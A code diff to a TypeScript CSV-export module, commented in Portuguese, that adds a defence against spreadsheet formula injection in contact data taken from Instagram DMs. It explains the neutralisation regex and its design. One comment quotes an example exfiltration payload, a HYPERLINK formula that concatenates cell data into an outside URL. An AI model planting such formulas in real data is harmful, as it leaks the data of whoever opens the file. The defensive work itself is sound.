@@ -18,10 +18,14 @@
 // SÃO DOIS BOTÕES, E O ANTIGO NÃO MUDA — decisão do dono.
 //
 //   "Exportar CSV" (seção "Com e-mail") é A LISTA DE E-MAIL: duas colunas,
-//     `where c.email is not null`, e o arquivo dele não muda nem um byte.
-//     `csvDaListaDeEmail`, abaixo, é aquele arquivo — e o caso byte a byte de
-//     tests/exportacao-de-contatos.test.ts é a única coisa nesta base capaz de
-//     acusar uma mudança nele.
+//     `where c.email is not null`, e o CONTEÚDO dele — quais contatos, quais
+//     colunas — não muda nem um byte. `csvDaListaDeEmail`, abaixo, é aquele
+//     arquivo, e o caso byte a byte de tests/exportacao-de-contatos.test.ts é a
+//     única coisa nesta base capaz de acusar uma mudança nele.
+//     A EXCEÇÃO, DECIDIDA PELO DONO DEPOIS, é a neutralização de fórmula
+//     (`neutralizarFormula`): ela muda os bytes da linha cujo nome COMEÇA com
+//     `=`, `+`, `-`, `@`, TAB ou CR, e vale para os dois arquivos pela MESMA
+//     função — o porquê está escrito nela.
 //   "Exportar todos os dados" leva TODO contato do recorte, tenha e-mail ou
 //     não, com as colunas do catálogo (lib/campos.ts) e os campos livres que o
 //     próprio marketing nomeou. `csvCompletoDeContatos`.
@@ -56,8 +60,62 @@ const BOM = "﻿";
 // abre com dois cliques.
 const FIM_DE_LINHA = "\r\n";
 
+/**
+ * O PRIMEIRO CARACTERE QUE FAZ A PLANILHA EXECUTAR A CÉLULA.
+ *
+ * `=`, `+`, `-` e `@` abrem fórmula no Excel e no Google Sheets. TAB e CR na
+ * frente entram na lista porque alguns leitores os descartam ANTES de decidir o
+ * que a célula é, e aí quem estava em segundo lugar vira o primeiro.
+ *
+ * É O COMEÇO DA CÉLULA, E SÓ ELE: um `=` no meio de um nome ("a=b") não é
+ * fórmula em leitor nenhum, e recusá-lo ali estragaria dado por nada.
+ */
+const ABRE_FORMULA = /^[=+\-@\t\r]/;
+
+/**
+ * A NEUTRALIZAÇÃO DA FÓRMULA — e por que ela vale para OS DOIS ARQUIVOS.
+ *
+ * O DADO DESTAS COLUNAS VEM DE DM DO INSTAGRAM: o nome do perfil, o @ e, desde
+ * a coleta de dados, a resposta que o próprio lead digitou num campo que o
+ * marketing inventou. É entrada não confiável por definição, e o arquivo é
+ * aberto com dois cliques na máquina de quem trabalha aqui. Um nome como
+ * `=HYPERLINK("http://…"&A1,"clique")` manda a planilha inteira embora, e o
+ * Excel o executa ao ABRIR — ninguém precisa clicar em nada.
+ *
+ * ASPAS NÃO RESOLVEM, E ISSO FOI MEDIDO: o escape de CSV logo abaixo já põe
+ * entre aspas toda célula com `;`, aspa ou quebra de linha, e a fórmula era
+ * avaliada do mesmo jeito. As aspas são do FORMATO DO ARQUIVO, e o leitor as
+ * tira antes de olhar o conteúdo; o que decide é o primeiro caractere do que
+ * sobra.
+ *
+ * A APÓSTROFE NA FRENTE É O QUE MUDA ESSE PRIMEIRO CARACTERE, e a perda fica
+ * escrita: um nome que legitimamente comece com `+` ou `-` ("+55 Ana", "- sem
+ * nome -") sai do arquivo com uma apóstrofe que não estava no dado. O preço é
+ * pago só por quem começa com um dos seis caracteres acima — que é exatamente o
+ * conjunto do ataque —, e a troca contrária (executar a fórmula de um estranho
+ * na máquina do marketing para preservar a pontuação de um nome raro) não é uma
+ * troca que alguém faria de propósito.
+ *
+ * ELA MORA DENTRO DE `cell`, E É POR ISSO QUE OS DOIS ARQUIVOS A GANHAM JUNTOS.
+ * A decisão do dono de o arquivo antigo "não mudar nem um byte" era sobre
+ * CONTEÚDO — quais contatos, quais colunas — e cede aqui, por decisão dele:
+ * tratar o MESMO dado de dois jeitos em dois arquivos seria a regra com dois
+ * donos que esta base persegue em toda parte, e a mais cara de todas, porque o
+ * lado frouxo seria justamente o arquivo que já está em produção. O caso byte a
+ * byte do botão antigo foi atualizado junto, com linhas que atravessam esta
+ * função.
+ */
+export function neutralizarFormula(s: string): string {
+  return ABRE_FORMULA.test(s) ? `'${s}` : s;
+}
+
 export function cell(v: unknown): string {
-  const s = v === null || v === undefined ? "" : String(v);
+  const bruto = v === null || v === undefined ? "" : String(v);
+  // A NEUTRALIZAÇÃO VEM ANTES DO ESCAPE, e a ordem é a decisão. O escape olha o
+  // CONTEÚDO para saber se precisa de aspas, e a apóstrofe é conteúdo: depois
+  // dele, ela cairia do lado de fora das aspas numa célula citada, onde não é
+  // conteúdo de nada — e a fórmula voltaria a ser a primeira coisa dentro delas.
+  const s = neutralizarFormula(bruto);
   return /["\n\r;]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
@@ -174,10 +232,16 @@ export function peneirar<T extends ContatoBuscavel & { categoria: string | null 
 export type ContatoDaListaDeEmail = { nome: string | null; email: string };
 
 /**
- * O ARQUIVO DO BOTÃO "Exportar CSV" — duas colunas, e ele não muda.
+ * O ARQUIVO DO BOTÃO "Exportar CSV" — duas colunas, e o conteúdo dele não muda.
  *
  * Ele veio para cá do JSX da rota não para mudar, mas justamente para PARAR de
  * poder mudar sem ninguém ver: aqui ele tem um caso que compara os bytes.
+ *
+ * A ÚNICA MUDANÇA DE BYTE QUE ELE JÁ SOFREU é a neutralização de fórmula
+ * (`neutralizarFormula`, acima), decidida pelo dono depois — e ela chega por
+ * `cell`, que é compartilhada, e não por nada escrito aqui. O caso byte a byte
+ * mede as duas coisas de uma vez: as linhas de sempre continuam iguais, e as de
+ * começo perigoso ganham a apóstrofe.
  *
  * OS DOIS CABEÇALHOS SÃO ESCRITOS À MÃO, e continuam sendo, de propósito.
  * "Nome" aqui não é o rótulo de um campo do catálogo — é o `coalesce(name,
